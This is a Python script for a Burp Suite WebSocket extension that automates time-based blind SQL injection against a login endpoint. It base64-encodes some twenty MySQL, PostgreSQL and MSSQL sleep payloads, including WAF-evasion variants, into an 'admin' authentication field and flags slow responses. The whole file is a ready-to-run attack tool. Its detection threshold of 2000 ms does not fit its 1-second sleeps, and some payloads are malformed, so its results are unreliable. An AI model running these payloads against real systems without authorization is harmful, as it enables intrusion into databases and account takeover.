import base64
import time

# Constants for the base64-wrapped JSON payload
START_PAYLOAD = '{"auth_user":"YWRtaW4=","auth_pass":"'
END_PAYLOAD = '"}'

# Blind SQL Injection Payloads with Sleep Conditions for Different Databases & Contexts
SLEEP_PAYLOADS = [
    # Comment Evasion Techniques
    "'/**/OR/**/SLEEP(1)/**/--",            # MySQL evasion
    "';/**/SELECT/**/pg_sleep(1);/**/--",   # PostgreSQL evasion
    "';/**/WAITFOR/**/DELAY/**/'00:00:01'; -- asdf",  # MSSQL evasion

    # Standard Sleep-Based Payloads
    "' OR SLEEP(1); -- asdf",                   # MySQL standard
    "'; SELECT pg_sleep(1); -- asdf",           # PostgreSQL standard
    "'; WAITFOR DELAY '00:00:01'; -- asdf",     # MSSQL standard

    # Subquery-Based Payloads
    "' OR (SELECT SLEEP(1)); -- asdf",          # MySQL with subquery
    "' OR (SELECT pg_sleep(1)); -- asdf",       # PostgreSQL with subquery
    "' OR (SELECT 1 FROM sys.dual WHERE 1=1 WAITFOR DELAY '00:00:01'); -- asdf",  # MSSQL subquery

    # Logical Conditions
    "' OR IF(1=1, SLEEP(1), 0); -- asdf",       # MySQL boolean-based condition
    "' OR CASE WHEN 1=1 THEN pg_sleep(1) ELSE null END; -- asdf",  # PostgreSQL CASE WHEN

    # Time-Based Function Variations
    "'; SELECT BENCHMARK(100000000, MD5('test')); -- asdf",  # MySQL CPU-based delay
    "'; SELECT pg_sleep(random() * 2); -- asdf",  # PostgreSQL randomized sleep
    "'; WAITFOR TIME '00:00:01'; -- asdf",  # MSSQL alternative time delay

    # UNION-Based Payloads
    "' UNION SELECT NULL, SLEEP(1), NULL -- asdf",      # MySQL UNION
    "' UNION SELECT NULL, pg_sleep(1), NULL -- asdf",   # PostgreSQL UNION
    "' UNION SELECT NULL, WAITFOR DELAY '00:00:01', NULL -- asdf",  # MSSQL UNION

    # Time Delay via Extracted Data
    "' OR (SELECT COUNT(*) FROM information_schema.tables WHERE SLEEP(1)); -- asdf",
    "' OR (SELECT COUNT(*) FROM pg_tables WHERE pg_sleep(1)); -- asdf",
    "' OR (SELECT COUNT(*) FROM sys.tables WHERE 1=1 WAITFOR DELAY '00:00:01'); -- asdf"
]

current_payload_index = 0  # Track which payload is being tested

def queue_websockets(upgrade_request, message):
    """
    Create a WebSocket connection and start testing the first SQLi payload.
    """
    global current_payload_index

    connection = websocket_connection.create(upgrade_request, Engine.BURP)
    send_payload(connection, current_payload_index)

def handle_outgoing_message(websocket_message, interesting):
    """
    Log outgoing messages for debugging or inspection.
    """
    results_table.add(websocket_message)

def handle_incoming_message(websocket_message, interesting):
    """
    1. Measures response time.
    2. If elapsed time > 2000ms, assume sleep condition was triggered.
    3. If no sleep is detected, move to the next payload.
    """

    global current_payload_index

    # Log/store the incoming message
    elapsed_time = websocket_message.getTime()

    print "Elapsed Time:", elapsed_time

    if elapsed_time > 2000:
        results_table.add(websocket_message)
        print "[+] Sleep detected with payload:", SLEEP_PAYLOADS[current_payload_index]
        print "[+] Response:", websocket_message.getMessage()

    # Move to the next payload if available
    current_payload_index += 1
    if current_payload_index < len(SLEEP_PAYLOADS):
        connection = websocket_message.getConnection()
        send_payload(connection, current_payload_index)
    else:
        print "[!] Finished testing all payloads. No sleep detected."

def send_payload(connection, index):
    """
    Encodes and sends the next SQLi time-delay payload.
    """
    payload = SLEEP_PAYLOADS[index]
    encoded_payload = base64.b64encode(payload)
    connection.queue(START_PAYLOAD + encoded_payload + END_PAYLOAD)
    print "[*] Testing payload:", payload
